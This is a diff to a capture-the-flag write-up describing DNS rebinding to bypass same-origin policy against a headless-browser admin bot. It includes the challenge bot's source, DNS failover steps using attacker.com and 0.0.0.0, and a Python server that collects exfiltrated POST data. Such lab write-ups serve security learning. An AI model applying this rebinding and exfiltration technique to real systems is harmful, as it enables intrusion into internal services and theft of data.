@@ -144,7 +144,7 @@ Same Origin Policy is similar to CORS, but it is enforced by the browser.
 This policy just makes it so that a client can only request resources from the same origin, that is the same: **protocal**, **domain**, and **port**.
 For example: a request from https://foo.com to http://foo.com wouldn't work because there is a different protocol between the two addresses.
 
-### Bypass
+### Bypass 1
 
 So the problem here is that our site, lets call it `http://attacker.com` is trying to make a request to `http://localhost/debug`, but because the domain, and the port are different then the request is not allowed by the bot's browser.
 
@@ -157,6 +157,53 @@ While searching for bypasses on hacktricks, I came across this method.
 The attack relies on changing the IP address for a domain (rebinding it), very quickly, sort of like a race condition.
 How does that help us here?
 Well in the source code for the bot, we can see that it doensn't perform all its actions immediately, there are delays.
+
+```javascript
+// challenge/bot.js
+const visit = async (url) => {
+    let browser;
+    try {
+        browser = await puppeteer.launch({
+            headless: true,
+            pipe: true,
+            args: [
+                "--no-sandbox",
+                "--disable-setuid-sandbox",
+                "--js-flags=--noexpose_wasm,--jitless",
+            ],
+            dumpio: true
+        });
+
+        let context = await browser.createIncognitoBrowserContext();
+        let page = await context.newPage();
+
+        await page.goto("http://localhost/login", {
+            waitUntil: "networkidle2"
+        });
+
+        await page.evaluate((user, pass) => {
+            document.querySelector("input[name=user]").value = user;
+            document.querySelector("input[name=pass]").value = pass;
+            document.querySelector("button[type=submit]").click();
+        }, "The Overseer", password);
+        await page.waitForNavigation();
+
+        await page.goto(url, {
+            waitUntil: "networkidle2"
+        });
+        await page.waitForTimeout(7000);
+
+        await browser.close();
+        browser = null;
+    } catch (err) {
+        console.log(err);
+    } finally {
+        if (browser) await browser.close();
+    }
+};
+
+```
+
 So the problem is that the client is making a request to `http://localhost/debug` from `http://attacker.com`, which gets blocked.
 But what if during the delay between the bot visiting the attacker site, and then timing out, we rebind the address for `http://attacker.com` to instead point to `127.0.0.1`?
 
@@ -170,3 +217,64 @@ A key element to making this attack work is having a low TTL on the DNS response
 I decided to use this [dns rebind site](https://lock.cmpxchg8b.com/rebinder.html) to facilitate the attack.
 The first address will be that of my EC2 instance, and the second will be `127.0.0.1`.
 Then we just need to run the attack a few times until we get the elements to line up properly.
+
+However this attack kept failing.
+I would always receive both requests to my ec2 instance, no matter how many times I tried.
+I tried changing the delays, but never worked.
+At the end of this article I will explore why this was.
+
+### Bypass 2
+
+In the same hacktricks article, a second subtype of dns rebinding was mentioned.
+Its very similar, but instead of depending on TTL to cause the browser to resolve the address, it will used availability of the server instead.
+We can use a service like AWS Route 53 to register 2 IP addresses for the same domain name, in our case it will be (`1.3.3.7` and `127.0.0.1`).
+For the first request to collect the CSRF payload, we allow the `1.3.3.7` ec2 instance to remain available, but once the page is loaded, we kill the instance.
+That way, when the next request is made to `http://attacker.com/debug` and it tries to make the request to our ec2 instance at `1.3.3.7`, the request will fail, and the victim's browser will fallback to `127.0.0.1`, allowing the attack to work.
+I will also set up a second ec2 instance to collect the post request, because I don't want to depend on the first ec2 instance booting up in time to catch the exfiltration POST request.
+In AWS this is called failover-routing.
+However, this requires registering a domain with AWS, which costs about 13$ depending on the name you chose, or 79$ to transfer in an existing domain.
+I tried to find a free alternative, but wasn't successful.
+Seems like at the minimum you need a domain, which I was able to get on Gandi for about 3$.
+Then I added in 2 DNS A records with the address of my ec2 instance and `0.0.0.0` as per the suggestion on HackTricks.
+
+![2 DNS A records](img/8.png)
+
+The min TTL is 300, but fortunately we won't depend on TTL for this attack, since we just depend on connectivity causing the browser to fallback to the alternative address (`0.0.0.0`).
+
+AND THIS WORKED !!
+
+![Kill the server after the first request](img/9.png) ![Request to exfil contains our debug info](img/10.png)
+
+At this point just little automation for killing the payload server after the first request, and saving the post request for further examination:
+
+```python
+#!/usr/bin/python3
+
+from http.server import HTTPServer, SimpleHTTPRequestHandler, test
+import sys
+
+class CORSRequestHandler(SimpleHTTPRequestHandler):
+    def end_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        SimpleHTTPRequestHandler.end_headers(self)
+
+    def do_GET(self):
+        if self.path == '/index.html':
+            SimpleHTTPRequestHandler.do_GET(self)
+            sys.exit(0)  # Exit the program after serving the index.html file
+        else:
+            SimpleHTTPRequestHandler.do_GET(self)
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        if self.path == '/exfil':
+            with open('debug.txt', 'wb') as f:
+                f.write(post_data)
+            print("[*] Exfil data written to debug.txt")
+
+if __name__ == '__main__':
+    test(CORSRequestHandler, HTTPServer, port=80)
+```
+
+![Referral token acquired](img/11.png)
